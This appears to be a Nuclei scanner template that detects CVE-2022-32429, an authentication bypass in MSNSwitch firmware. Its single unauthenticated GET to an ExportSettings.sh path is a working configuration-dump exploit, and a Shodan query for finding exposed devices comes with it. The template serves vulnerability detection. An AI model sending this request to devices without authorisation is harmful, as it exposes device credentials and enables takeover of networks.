id: CVE-2022-32429
info:
  name: MSNSwitch Firmware MNT.2408 - Configuration Dump
  author: theabhinavgaur
  severity: critical
  description: An authentication bypass vulnerability in MSNSwitch Firmware MNT.2408
    allows the download of the device's full configuration and can be exploited to
    gain full root access.
  reference:
  - https://packetstormsecurity.com/files/169819/MSNSwitch-Firmware-MNT.2408-Remote-Code-Execution.html
  - https://elifulkerson.com/CVE-2022-32429/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-32429
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-32429
    cwe-id: CWE-287
  metadata:
    shodan-query: http.favicon.hash:-2073748627 || http.favicon.hash:-1721140132
    verified: 'true'
    impact: The impact of CVE-2022-32429 on MSNSwitch Firmware MNT.2408 is that an
      authentication bypass can lead to unauthorized access and control over the device,
      potentially compromising the network and exposing sensitive data to malicious
      actors.
    recommendation: I highly recommend updating MSNSwitch Firmware MNT.2408 immediately
      to prevent the potential authentication bypass and possible root shell access
      vulnerability.
  tags: config,dump,packetstorm,cve,cve2022,msmswitch,unauth,switch
requests:
- method: GET
  path:
  - '{{BaseURL}}/cgi-bin-hax/ExportSettings.sh'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - SSID1
  - type: regex
    part: header
    regex:
    - filename="Settings(.*).dat
    - application/octet-stream
    condition: and
  - type: status
    status:
    - 200
